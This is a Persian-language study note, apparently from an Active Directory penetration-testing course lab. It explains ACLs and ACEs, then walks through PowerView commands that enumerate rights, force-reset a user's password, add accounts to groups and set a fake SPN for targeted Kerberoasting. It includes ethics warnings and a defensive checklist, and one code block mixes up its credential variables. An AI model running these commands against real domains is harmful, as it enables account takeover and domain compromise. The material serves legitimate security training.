

[[Persistence using ACLs -Rights Abuse]]


### مقدمه‌ای بر سوء‌استفاده از ACL

به دلایل امنیتی، همهٔ کاربران و کامپیوترها در محیط Active Directory نمی‌توانند به همهٔ اشیاء و فایل‌ها دسترسی داشته باشند. این نوع مجوزها از طریق **فهرست‌های کنترل دسترسی (ACL)** مدیریت می‌شوند. یک پیکربندی نادرست کوچک در ACL می‌تواند مجوزها را به اشیائی نشت دهد که نیازی به آن‌ها ندارند و این موضوع تهدید جدی‌ای برای وضعیت امنیتی دامنه به‌وجود می‌آورد.

---

### مروری بر فهرست کنترل دسترسی (ACL)

در ساده‌ترین شکل، ACLها فهرست‌هایی هستند که 
الف) مشخص می‌کنند چه کسی به کدام دارایی/منبع دسترسی دارد و 
ب) سطح دسترسی‌ای که به آن‌ها داده شده است را تعریف می‌کنند. تنظیمات داخل یک ACL را **ورودی‌های کنترل دسترسی (ACE)** می‌نامند. هر ACE به یک کاربر، گروه یا فرایند (که به آن‌ها اصول یا موجودیت‌های امنیتی — security principals — گفته می‌شود) نگاشت می‌شود و حقوق اعطا شده به آن موجودیت را تعریف می‌کند.  
هر شیء یک ACL دارد، ولی می‌تواند چندین ACE داشته باشد چون چندین موجودیت امنیتی ممکن است به اشیاء در AD دسترسی داشته باشند. ACLها همچنین می‌توانند برای ثبت (auditing) دسترسی‌ها در AD به‌کار روند.



---

### دو نوع ACL وجود دارد:  

ما در تصویر زیر، ACL مربوط به حساب کاربری **forend** را می‌بینیم.  
هر موردی که در بخش **Permission entries** نمایش داده می‌شود، در واقع **DACL** حساب کاربری است.  
ورودی‌های جداگانه (مثل **Full Control** یا **Change Password**) همان **ACE**ها هستند که نشان می‌دهند چه حقوقی روی این شیء کاربر به کاربران و گروه‌های مختلف داده شده است.  

![[Pasted image 20250924052339.png]]



🔹 **نمایش ACL کاربر forend**  

**SACL**ها را می‌توان در تب **Auditing** مشاهده کرد.  

🔹 **نمایش SACLها در تب Auditing**  

---

### ۱. Discretionary Access Control List (DACL)  
- تعیین می‌کند که کدام **اصول امنیتی (security principals)** اجازه دسترسی یا عدم دسترسی به یک شیء را دارند.  
- DACL از مجموعه‌ای از ACEها تشکیل شده است که یا **اجازه (Allow)** می‌دهند یا **رد (Deny)** می‌کنند.  
- وقتی کسی تلاش می‌کند به یک شیء دسترسی پیدا کند، سیستم **DACL** را بررسی می‌کند تا ببیند سطح دسترسی مجاز چقدر است.  
- اگر یک شیء **DACL نداشته باشد**، همهٔ افرادی که به آن دسترسی پیدا می‌کنند، **تمامی مجوزها (Full Rights)** را خواهند داشت.  
- اگر DACL وجود داشته باشد ولی هیچ **ACE** خاصی در آن تعریف نشده باشد، سیستم دسترسی را به همهٔ کاربران، گروه‌ها یا فرایندها **مسدود می‌کند**.  

---

### ۲. System Access Control List (SACL)  
- به مدیران این امکان را می‌دهد که **تلاش‌های دسترسی** به اشیاء محافظت‌شده را **ثبت (Log)** کنند.  

![[Pasted image 20250924052404.png]]


---

### ورودی‌های کنترل دسترسی (ACE‌ها)

همان‌طور که قبلاً گفته شد، **فهرست‌های کنترل دسترسی (ACL)** شامل ورودی‌های ACE هستند که یک کاربر یا گروه را نام برده و سطح دسترسی آن‌ها به یک شیء قابل‌حفاظت را مشخص می‌کنند. سه نوع اصلی ACE وجود دارد که روی تمام اشیاء قابل‌حفاظت در AD قابل اعمال‌اند:

**نوع ACE — شرح**

- **Access denied ACE**  
    در داخل یک **DACL** استفاده می‌شود تا نشان دهد یک کاربر یا گروه به‌صورت صریح **از دسترسی به یک شیء منع** شده است.
    
- **Access allowed ACE**  
    در داخل یک **DACL** استفاده می‌شود تا نشان دهد یک کاربر یا گروه به‌صورت صریح **اجازه دسترسی به یک شیء** را دارد.
    
- **System audit ACE**  
    در داخل یک **SACL** استفاده می‌شود تا هنگام تلاش یک کاربر یا گروه برای دسترسی به یک شیء، **لاگ‌های ممیزی** تولید کند. این نوع ACE ثبت می‌کند که آیا دسترسی داده شده یا رد شده و چه نوع دسترسی‌ای رخ داده است.
    

---

هر ACE از چهار مولفهٔ زیر تشکیل شده است:

(در رابط گرافیکی Active Directory Users and Computers — ADUC — می‌توان این موارد را دید. در تصویر مثال، برای ورودی ACE مربوط به کاربر `forend` می‌توان موارد زیر را مشاهده کرد:)

1. **شناسهٔ امنیتی (SID)** کاربر/گروهی که به شیء دسترسی دارد (یا نام اصلی موجودیت که به‌صورت گرافیکی نمایش داده می‌شود).
    
2. **یک پرچم که نوع ACE را نشان می‌دهد** (مثلاً deny، allow یا system audit).
    
3. **مجموعه‌ای از پرچم‌ها که مشخص می‌کند آیا اشیاء/کانتینرهای فرزند می‌توانند این ورودی ACE را از شیء اصلی یا والد به ارث ببرند یا نه** (Inheritance flags).
    
4. **یک Access Mask** که یک مقدار ۳۲-بیتی است و حقوق اختصاص داده‌شده به شیء را تعریف می‌کند (مثلاً Full Control، Read، Write و غیره).
    

---

Viewing Permissions through Active Directory Users &
Computers

![[Pasted image 20250924052728.png]]


در این ماژول، ما فهرست‌برداری (enumeration) و استفاده از چهار ACE مشخص را پوشش می‌دهیم تا توان حملات مبتنی بر ACL را نشان دهیم.  
این گرافیک که از گرافیکی از Charlie Bromberg (Shutdown) اقتباس شده، تقسیم‌بندی بسیار خوبی از حملات ممکنِ مبتنی بر ACE و ابزارهای انجام این حملات از هر دو سمت ویندوز و لینوکس (در صورت کاربرد) ارائه می‌دهد. در بخش‌های بعدی، عمدتاً به فهرست‌برداری و اجرای این حملات از یک میزبان حمله ویندوزی می‌پردازیم و در جاهایی اشاره می‌کنیم که این حملات چگونه می‌توانند از لینوکس نیز انجام شوند. یک ماژول بعدی مختصِ حملات ACL خیلی عمیق‌تر به هر کدام از حملات این گرافیک و اجرای آن‌ها از ویندوز و لینوکس خواهد پرداخت.

ACE‌هایی که بررسی می‌کنیم و نحوهٔ سوء‌استفاده:

- `GenericWrite` سوء‌استفاده‌شده با `Set-DomainObject`
    
- `WriteOwner` سوء‌استفاده‌شده با `Set-DomainObjectOwner`
    
- `WriteDACL` سوء‌استفاده‌شده با `Add-DomainObjectACL`
    
- `AllExtendedRights` سوء‌استفاده‌شده با `Set-DomainUserPassword` یا `Add-DomainGroupMember`
    
- `AddSelf` سوء‌استفاده‌شده با `Add-DomainGroupMember`
    

---

### توضیحات هر مورد و نکات عملی

**ForceChangePassword**

- این اجازه به ما حق **ریست کردن رمز یک کاربر** را می‌دهد بدون اینکه ابتدا رمز فعلی او را بدانیم.
    
- باید با احتیاط استفاده شود و معمولاً بهتر است قبل از ریست کردن رمز، با مشتری (مالک) هماهنگ شود.
    

**GenericWrite**

- این حق اجازهٔ نوشتن روی هر صفت غیرمحافظت‌شدهٔ یک شیء را می‌دهد.
    
- کاربردهای رایج سوء‌استفاده:
    
    - روی یک **کاربر**: می‌توانیم به او یک **SPN** نسبت دهیم و حمله‌ی **Kerberoasting** انجام دهیم (Kerberoasting زمانی موثر است که حساب هدف رمز ضعیفی داشته باشد).
        
    - روی یک **گروه**: می‌توانیم خودمان یا یک Principal دیگر را به آن گروه اضافه کنیم (اگرچه بسته به ACE ممکن است نیازمند AddSelf یا WriteDACL باشه).
        
    - روی یک **computer object**: ممکن است بتوانیم حملهٔ **resource-based constrained delegation** انجام دهیم (این موضوع خارج از دامنهٔ این ماژول است ولی بسیار پرخطر است).
        

**AddSelf**

- نشان‌دهندهٔ گروه‌های امنیتی‌ای است که **یک کاربر می‌تواند خودش را به‌شان اضافه کند**.
    
- اگر کاربر بتواند خودش را به گروه‌هایی با امتیاز بالا اضافه کند، سریعاً امتیاز بالا (مثل دسترسی مدیریتی) به‌دست می‌آورد.
    

**GenericAll**

- به ما **کنترل کامل (Full Control)** روی یک شیء را می‌دهد.
    
- تبعات عملی بستگی به نوع شیء دارد:
    
    - اگر روی **کاربر** یا **گروه** باشد → می‌توانیم عضویت گروه را تغییر دهیم، رمز را مجبورانه تغییر دهیم (force change)، یا حملات هدفمند Kerberoasting انجام دهیم.
        
    - اگر روی **computer object** باشد و در محیط **LAPS** (Local Administrator Password Solution) فعال باشد → می‌توانیم رمز LAPS را بخوانیم و دسترسی Local Admin به آن ماشین بگیریم؛ این می‌تواند برای حرکت جانبی یا ارتقای امتیاز در دامنه بسیار مفید باشد.




ما گه‌گاه با ACEها (اختیارات) جالب دیگری در Active Directory برخورد خواهیم کرد. روش‌شناسی فهرست‌برداری احتمال‌های حملات مبتنی بر ACL با استفاده از ابزارهایی مثل **BloodHound** و **PowerView** و حتی ابزارهای مدیریتی خودِ AD باید به‌قدری قابل تطبیق باشد که هر زمان با اختیارات جدیدی در طبیعت مواجه شدیم — که ممکن است هنوز با آن‌ها آشنا نباشیم — به ما کمک کند.  
برای مثال، ممکن است داده‌ای را وارد BloodHound کنیم و ببینیم کاربری که کنترلش را در اختیار داریم (یا می‌توانیم بالقوه کنترلش کنیم) حق **خواندن رمز یک Group Managed Service Account (gMSA)** را از طریق یال `ReadGMSAPassword` دارد. در این حالت، ابزارهایی مثل **GMSAPasswordReader** وجود دارند که می‌توانیم از آن‌ها استفاده کنیم تا رمز آن حساب سرویس را به‌دست آوریم.

- از **BloodHound** برای کشفِ روابطِ مجوزی (edges) بین حساب‌ها/گروه‌ها/اشیاء استفاده کن؛ مخصوصاً دنبال یال‌هایی مثل `ReadGMSAPassword` بگرد.
    
- اگر BloodHound یالی نشان داد که حسابی قادر به خواندن رمز gMSA هست، می‌تونی با ابزارهایی مثل **GMSAPasswordReader** یا تکنیک‌های قانونی-آزمایشی رمز را استخراج و تحلیل کنی (فقط در محیط تست یا با مجوز مشتری).
    
- برای حقوقِ توسعه‌یافتهٔ ناشناخته (`Unexpire-Password`, `Reanimate-Tombstones` و غیره) خوبه که مستندات MS و منابع معتبری که نحوهٔ استفادهٔ قانونی/دفاعی از آن‌ها را شرح داده‌اند، سریع مرور کنی تا بفهمی این حقوق چه تأثیری دارند و چگونه باید لاگ/هشدار گذاری شوند.
    
- هر وقت با یک یال یا حق جدید مواجه شدی که ناآشناست، واکنش‌ استاندارد: ۱) سندش کن، ۲) سرچ کن/مستندات بخون، ۳) بررسی کن آیا در محیط شما اعمال شده و ۴) در صورت سوء‌استفاده‌پذیری، توصیه‌های اصلاحی ارائه بده.


ACL Attacks in the Wild
We can use ACL attacks for:

	Lateral movement
	Privilege escalation
	Persistence



### شرح حمله

1 **سوء‌استفاده از مجوزهای ریست رمز (forgot password permissions)**  
کاربران Help Desk و سایر کاربران IT اغلب مجوزهایی دارند تا عملیات ریست رمز و کارهای پرامتیا‌زتری انجام دهند. اگر ما بتوانیم حسابی را که این مجوزها را دارد بدست بگیریم (یا حسابی در گروهی که این مجوزها را به اعضایش می‌دهد)، ممکن است بتوانیم رمزِ یک حساب با امتیازات بالاتر در دامنه را ریست کنیم.

---

2 **سوء‌استفاده از مدیریت عضویت گروه**  
معمولاً دیده می‌شود که کارکنان Help Desk و دیگران حق اضافه/حذف کاربر از گروهی خاص را دارند. همیشه ارزش دارد که این موارد را بیشتر فهرست‌برداری (enumerate) کنیم، چون گاهی ممکن است بتوانیم یک حسابی را که کنترلش را داریم به یک گروه داخلی (built-in) با امتیازات بالا یا به گروهی که امتیازات جذاب می‌دهد اضافه کنیم.

---

3 **حقوق بیش‌ازحد کاربران (Excessive user rights)**  
اغلب می‌بینیم که اشیاء کاربر، کامپیوتر و گروه دارای حقوقی فراتر از حد لازم هستند که مشتری احتمالاً از آن بی‌خبر است. این می‌تواند بعد از نصب نرم‌افزاری رخ دهد (مثلاً Exchange در زمان نصب مجموعه‌ای از تغییرات ACL را ایجاد می‌کند) یا ناشی از پیکربندی قدیمی یا تصادفی باشد که به کاربر حقوق ناخواسته داده است. گاهی ما حسابی را تصاحب می‌کنیم که قبلاً برای راحتی یا رفع سریع یک مشکل به آن حقوق داده شده بوده.

---

این سه سناریو از رایج‌ترین‌ها در دنیای ACLهای Active Directory هستند، هرچند سناریوهای دیگری هم ممکن است وجود داشته باشند. ما روش‌های فهرست‌برداری این حقوق را به روش‌های مختلف بررسی می‌کنیم، حملات را اجرا کرده (در چارچوب مجاز و کنترل‌شده) و سپس پاکسازی/بازگردانی تغییرات را انجام می‌دهیم.

**تذکر:** بعضی از حملات ACL می‌توانند «مخرب» تلقی شوند — مثل تغییر رمز یک کاربر یا انجام تغییرات دیگر داخل دامنهٔ AD مشتری. اگر شک داری، همیشه بهتر است قبل از اجرای هر حمله‌ای از مشتری مجوز کتبی بگیری تا در صورت بروز مشکل، مستندات اجازهٔ انجام کار وجود داشته باشد. ما باید همیشه حملات‌مان را از ابتدا تا انتها با دقت مستندسازی کنیم و هر تغییری که ایجاد کرده‌ایم را بازگردانیم. این داده‌ها باید در گزارش‌مان قرار بگیرند و به‌وضوح تغییرات انجام‌شده را مشخص کنیم تا مشتری بتواند تأیید کند که تغییرات واقعاً برگشت داده شده‌اند.

---


## **Enumerating ACLs with PowerView**

بیایم سراغ فهرست‌برداری (enumeration) ACLها با استفاده از **PowerView** و بررسیِ چند نمایش گرافیکی با **BloodHound**. سپس چند سناریو/حمله را بررسی می‌کنیم که در آن‌ها ACEهایی که فهرست‌برداری کردیم را می‌توان برای به‌دست‌آوردن دسترسی بیشتر در محیط داخلی به کار برد.


**خروجی اولیهٔ PowerView (`Find-InterestingDomainAcl`)**

```
ObjectDN : DC=INLANEFREIGHT,DC=LOCAL
AceQualifier : AccessAllowed
ActiveDirectoryRights : ExtendedRight
ObjectAceType : ab721a53-1e2f-11d0-9819-00aa0040529b
AceFlags : ContainerInherit
AceType : AccessAllowedObject
InheritanceFlags : ContainerInherit
SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-5189
IdentityReferenceName : Exchange Windows Permissions
IdentityReferenceDomain : INLANEFREIGHT.LOCAL
IdentityReferenceDN : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL
IdentityReferenceClass : group
ObjectDN : DC=INLANEFREIGHT,DC=LOCAL
```

**ترجمه:**

- نام شیء: `DC=INLANEFREIGHT,DC=LOCAL` (ریشهٔ دامنه)
    
- نوع ACE: اجازه (`AccessAllowed`)
    
- حقِ اختصاص داده‌شده: `ExtendedRight` (حق توسعه‌یافته)
    
- `ObjectAceType`: یک GUID (که نشان‌دهندهٔ نوع دقیقِ حقِ توسعه‌یافته است)
    
- ACE به‌صورت ContainerInherit تنظیم شده (به فرزندها نیز به ارث می‌رسد)
    
- SID متعلق به یک گروه به نام `Exchange Windows Permissions` است.
    

---

**شرح وضعیتِ مسئله و روش هدفمند‌سازی فهرست‌برداری**  
اگر بخواهیم همه‌چیز را در یک ارزیابی زمان‌بندی‌شده بررسی کنیم، احتمالاً هیچ‌وقت همهٔ داده‌ها را کامل نمی‌کنیم یا قبل از اتمام ارزیابی چیزی کشف نمی‌کنیم. بنابراین روش مؤثرتر این است که **فهرست‌برداری هدفمند** را از یک کاربر که کنترلش را داریم شروع کنیم.

مثال: کاربری به نام `wley` را داریم (به‌دست آمده قبلاً). ابتدا باید **SID** آن کاربر را بگیریم تا جستجو مؤثر باشد.

دستورات نمونه:

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

> نکته: اگر بدون فلگ `ResolveGUIDs` جستجو کنی، خروجی شامل GUIDها (مثل `00299570-246d-11d0-a768-00aa006e0529`) می‌شود که برای انسان خوانا نیست — باید GUID را به نام حق نگاشت (map) کنیم یا از `ResolveGUIDs` استفاده کنیم.

---

**مثالِ خروجی بعد از فیلتر و نگاشت GUID (با ResolveGUIDs یا نگاشت معکوس)**

خروجی تبدیل‌شده نشان می‌دهد که:

- `ObjectDN` → `CN=Dana Amundsen,...,DC=INLANEFREIGHT,DC=LOCAL` (آیدی شیءِ کاربر مقصد)
    
- `ActiveDirectoryRights` → `ExtendedRight`
    
- `ObjectAceType` → همان GUID `00299570-246d-11d0-a768-00aa006e0529`
    
- و با نگاشت GUID به نامِ حقِ توسعه‌یافته می‌بینیم که این GUID متناظر است با:  
    `User-Force-Change-Password` (یعنی حق «اجبار به تغییر رمز/Force Change Password»)
    

دستورات نگاشت معکوس مثال:

```powershell
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |
  Select Name,DisplayName,DistinguishedName,rightsGuid |
  ?{$_.rightsGuid -eq $guid} | fl
```

خروجیِ نگاشت نشان می‌دهد:

- `Name : User-Force-Change-Password`
    
- `DisplayName : Reset Password`
    
- `DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL`
    
- `rightsGuid : 00299570-246d-11d0-a768-00aa006e0529`
    

---

# جمع‌بندیِ سریع (چه چیزی فهمیدیم)

- با جستجوی هدفمند ACLها برای SID کاربر `wley`، دیدیم که یک ACE از نوع `ExtendedRight` روی شیء `Dana Amundsen` وجود دارد.
    
- این `ExtendedRight` با GUID مشخص وقتی Resolve شود به نام `User-Force-Change-Password` ترجمه می‌شود.
    
- نتیجهٔ مهم: **کاربر `wley` یا گروهی که او عضوش است، اجازهٔ اجباری تغییر رمز (`Force Change Password`) را روی حساب `Dana Amundsen` دارد.**
    
    - این یعنی اگر چنین حقی در محیط واقعی وجود داشته باشد و شما در شرایط قانونی/مجوز‌دار هستی، می‌توانی این مجوز را بررسی و در صورت لزوم گزارش و اصلاح کنی.
        

---

اگر می‌خواهی، برات این موارد رو هم آماده کنم:

- همان فرمان‌ها با فلگ `ResolveGUIDs` نشان داده شده تا خروجی به‌صورت خوانا بیاد،
    
- یا یک کوئری BloodHound/Cypher معادل برای پیدا کردن ACEهای `User-Force-Change-Password` در کل دامنه،
    
- یا یک چک‌لیستِ فوری برای تیم AD تا این نوع مجوزها را بررسی و اصلاح کنند. کدومش رو بخوام آماده کنم؟


```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ?
{$_.SecurityIdentifier -eq $sid}
```
```
AceQualifier : AccessAllowed
ObjectDN : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-
NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
ObjectAceType : User-Force-Change-Password
ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags : ContainerInherit
BinaryLength : 56
AceType : AccessAllowedObject
ObjectAceFlags : ObjectAceTypePresent
IsCallback : False
PropagationFlags : None
SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask : 256
AuditFlags : None
IsInherited : False
AceFlags : ContainerInherit
InheritedObjectAceType : All
OpaqueLength : 0
```


**چرا این مثال را با قدم‌به‌قدم آوردیم در حالی که می‌توانستیم مستقیم با `ResolveGUIDs` جستجو کنیم؟**

مهم است که بفهمیم ابزارهای ما دقیقاً چه کاری انجام می‌دهند و روش‌های جایگزین در مجموعهٔ‌ابزارمان داشته باشیم تا در صورت خراب شدن یا مسدود شدن یک ابزار، راه‌های دیگری برای پیش‌روی داشته باشیم. قبل از ادامه، اجازه بدهید سریع نگاهی بیندازیم به چگونگی انجام همین کار با `Get-Acl` و `Get-ADUser` — دستورات و cmdletهایی که ممکن است روی یک سیستمِ کلاینت در دسترس ما باشند. دانستن اینکه چطور این نوع جستجو را بدون ابزارهایی مثل PowerView انجام دهیم بسیار مفید است و می‌تواند ما را از هم‌رده‌هایمان متمایز کند. این دانش ممکن است وقتی به ما دسترسی داده می‌شود تا از یکی از سیستم‌های مشتری کار کنیم و محدود به ابزارهای محلی آن سیستم باشیم و نتوانیم ابزارهای خودمان را آپلود کنیم، به کار آید.

---

### ساخت فهرست کاربران دامنه

```
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
...
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

در ادامه، هر خط فایل را با یک حلقه `foreach` می‌خوانیم و با استفاده از `Get-Acl` اطلاعات ACL مربوط به هر کاربر دامنه را می‌گیریم. برای هر نام کاربری (هر خط در `ad_users.txt`) آن را به `Get-ADUser` می‌دهیم و سپس فقط خاصیت `Access` را انتخاب می‌کنیم تا اطلاعات مربوط به مجوزها (access rights) را دریافت کنیم. در نهایت، خاصیت `IdentityReference` را با مقدار SID یا نام کاربری‌ای که ما کنترلش را داریم (یا می‌خواهیم بررسی کنیم چه حقوقی دارد) برابر قرار می‌دهیم — در مثال ما این کاربر `wley` است.

---

### توضیح گام‌ها (خلاصهٔ عملی)

1. با `Get-DomainObjectACL -ResolveGUIDs -Identity *` همهٔ ACLهای دامنه را می‌گیریم و براساس SID مورد نظر فیلتر می‌کنیم تا ببینیم آن SID چه حقوقی روی چه اشیائی دارد.
    
2. با `Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt` لیستی از تمام `SamAccountName`های دامنه را در فایل `ad_users.txt` ذخیره می‌کنیم.
    
3. سپس با خواندن هر خط از `ad_users.txt` در یک حلقه، برای هر کاربر `Get-Acl` (یا `Get-ADUser` سپس انتخاب `Access`) اجرا می‌کنیم تا ACEهای مربوط به آن کاربر را استخراج کنیم.
    
4. با مقایسهٔ `IdentityReference` با SID کاربر هدف (`$sid`) می‌توانیم بفهمیم کاربر هدف روی کدام اشیاء چه حقوقی دارد.
---

```
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ?
{$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

```
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```


### یافتهٔ کلیدی (خلاصه‌ یک خطی)

`wley` → می‌تواند رمز `damundsen` را **اجباراً تغییر** دهد → `damundsen` می‌تواند خود/دیگران را به گروه **Help Desk Level 1** اضافه کند → آن گروه جزوی از **Information Technology** است → اعضای **Information Technology** **کنترل کامل (GenericAll)** روی `Angela Dunn` دارند → مسیر ساده برای ارتقای دسترسی به حساب‌های قوی‌تر.

---

### گام‌های اصلی که انجام شد (فقط عنوانی)

1. گرفتن SID کاربرِ تحت کنترل: `Convert-NameToSid wley`
    
2. فهرست‌برداری ACLها و فیلتر بر مبنای SID: `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? { $_.SecurityIdentifier -eq $sid }`
    
3. بررسی ACE روی `Dana Amundsen` → مشخص شدن `User-Force-Change-Password` برای `wley`
    
4. یافتن اینکه `damundsen` دارای `GenericWrite` روی گروه **Help Desk Level 1** است
    
5. بررسی nesting: `Help Desk Level 1` عضو `Information Technology` است
    
6. بررسی ACLهای `Information Technology` → `GenericAll` روی `Angela Dunn`
    

---

### معنای فنیِ خلاصه (چه‌چیزی ممکن است مهاجم/تست‌کننده انجام دهد)

- Force-change password → گرفتن کنترل مستقیم روی `damundsen` (در صورت اجازهٔ مشتری).
    
- GenericWrite روی گروه → افزودن خود/اکانت تحت کنترل به گروه → به ارث بردن حقوق بالاتر.
    
- GenericAll روی کاربرِ هدف → امکان تغییر رمز، تغییر گروه‌ها، خواندن attributeها، و دسترسی به منابع سرویس.
    

---

### نکات کوتاه دفاعی (چک‌لیست سریع)

- بررسی و کاهش ACEهای حساس: `Force-Change-Password`, `GenericWrite`, `GenericAll`, `AddSelf`.
    
- بازنگری عضویتگروه‌ها و nested groups؛ حذف nesting غیرضروری.
    
- لاگ و آلارم برای استفاده از Force-Change-Password و تغییرات عضویت گروه.
    
- نگهداری مستندات تغییرات و دریافت مجوز کتبی قبل از هر عملیات تغییر در AD.
    

---

## تغییر رمز با استفاده از PowerView — خلاصهٔ مراحل

### ۱) ساختن یک `SecureString` برای رمزِ کاربری که با آن احراز هویت می‌کنیم

ابتدا رمز کاربرِ تحت کنترل (در اینجا `wley`) را به‌صورت امن در یک `SecureString` می‌سازیم و سپس یک شیء `PSCredential` می‌سازیم تا با آن احراز هویت کنیم.

```powershell
# ساخت SecureString و PSCredential برای wley
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

### ۲) ساختن `SecureString` برای رمز جدید هدف (damundsen)

رمز جدیدی که می‌خواهیم روی حساب هدف بگذاریم را به‌صورت `SecureString` می‌سازیم:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

### ۳) استفاده از `Set-DomainUserPassword` از ماژول PowerView برای تغییر رمز

ماژول PowerView را ایمپورت کرده و با استفاده از پارامتر `-Credential` (که شامل اعتبارنامهٔ `wley` است) رمز کاربر `damundsen` را تغییر می‌دهیم. بهتر است همیشه `-Verbose` را اضافه کنید تا خروجی و پیغام‌های کامل را ببینید.

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

خروجی نمونه نشان می‌دهد که فرمان با موفقیت اجرا شده و رمز `damundsen` ریست شده است:

```
VERBOSE: Using alternate credentials
VERBOSE: Attempting to set the password for user 'damundsen'
VERBOSE: Password for user 'damundsen' successfully reset
```

---

### نکتهٔ تکمیلی

- این کار را می‌توان از یک میزبان لینوکسی هم انجام داد با ابزارهایی مانند `pth-net` از مجموعه‌ی `pth-toolkit` (اگر نیاز به Pass-the-Hash/NTLM-based auth باشد).
    
- **هشدار اخلاقی/قانونی:** هرگونه تغییر رمز یا اعمال تغییرات در AD را **فقط** با مجوز کتبی مشتری انجام ده — مستندسازی (log) و بازگردانی تغییرات را فراموش نکن.
    

---


# سوء‌استفاده از ACL — خلاصهٔ مراحل (مختصر)

### وضعیت شروع

- ما قبلاً کنترل حساب `wley` را داشتیم (هش NTLMv2 گرفته و کرک شده).
    
- هدف نهایی: رسیدن به `adunn` که روی آن حقوقی وجود دارد که امکان DCSync و در نتیجه کنترل دامنه را فراهم می‌کند.
    

---

### گام‌های انجام‌شده (عملیاتی، خلاصه)

1. **تغییر رمز حساب هدف (`damundsen`)**
    
    - با استفاده از اعتبار `wley`، رمز `damundsen` را با PowerView ریست می‌کنیم (ساخت SecureString و PSCredential برای `wley` و سپس `Set-DomainUserPassword` برای `damundsen`).
        
    - نمونه:
        
        ```powershell
        $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
        $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
        Import-Module .\PowerView.ps1
        Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
        ```
        
2. **اضافه کردن `damundsen` به گروه Help Desk Level 1**
    
    - ابتدا اعضای گروه را بررسی کردیم (`Get-ADGroup ... -ExpandProperty Members`) تا ببینیم عضو نیستیم.
        
    - سپس با اعتبار `damundsen` عضو جدید را اضافه کردیم:
        
        ```powershell
        Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
        ```
        
    - خروجی نشان داد که اضافه شدن موفق بوده (`damundsen` در لیست اعضا ظاهر شد).
        
3. **استفاده از nested group membership برای بالا بردن امتیاز**
    
    - گروه **Help Desk Level 1** داخل گروه **Information Technology** است.
        
    - اعضای گروه **Information Technology** دارای `GenericAll` روی کاربر `Angela Dunn (adunn)` بودند (یعنی کنترل کامل آن حساب).
        
    - بنابراین با اضافه شدن به Help Desk Level 1، امتیازات ارثی می‌شود و به‌عنوان عضو Information Technology رفتار خواهیم کرد.
        
4. **گزینهٔ جایگزین: Kerberoast هدفمند**
    
    - چون `GenericAll` داریم، می‌توانیم (در چارچوب مجاز) SPN کاربر هدف را تغییر دهیم تا یک SPN موقت بسازیم و سپس تیکت سرویس (TGS) آن را درخواست و آفلاین کرک کنیم (Kerberoasting).
        
    - ابزارهایی مانند `targetedKerberoast` روی لینوکس این کار را خودکار انجام می‌دهند (ایجاد SPN موقت → دریافت هش → حذف SPN).
        

---


## ساختن SPN جعلی

اگر این کار موفقیت‌آمیز باشد، می‌توانیم با روش‌های مختلف کارِ Kerberoast را اجرا کنیم و هش را برای کرک آفلاین به‌دست آوریم. بیایید این کار را با **Rubeus** انجام دهیم.

### افزودن SPN جعلی به حساب هدف

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
VERBOSE: Using alternate credentials for Get-Domain
VERBOSE: Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: Using alternate credentials for LDAP connection
VERBOSE: Get-DomainObject filter string: (&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```


## معنی دستور (سطح فنی، بدون اجرای خط‌به‌خط)

`Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`

- این یک دستور PowerShell (تابع از ماژول‌هایی مثل PowerView) است که **ویژگی/Attribute** یک شیء در اکتیو دایرکتوری را تغییر می‌دهد.
    
- `-Identity adunn` 
- مشخص می‌کند این تغییر روی حساب `adunn` (مثلاً کاربر Angela Dunn) اعمال شود.
    
- `-SET @{serviceprincipalname='notahacker/LEGIT'}`
- یعنی مقدار attribute با نام **servicePrincipalName** برای آن حساب تنظیم شود (در اینجا مقدار مثال: `notahacker/LEGIT`).
    
- `-Credential $Cred2`
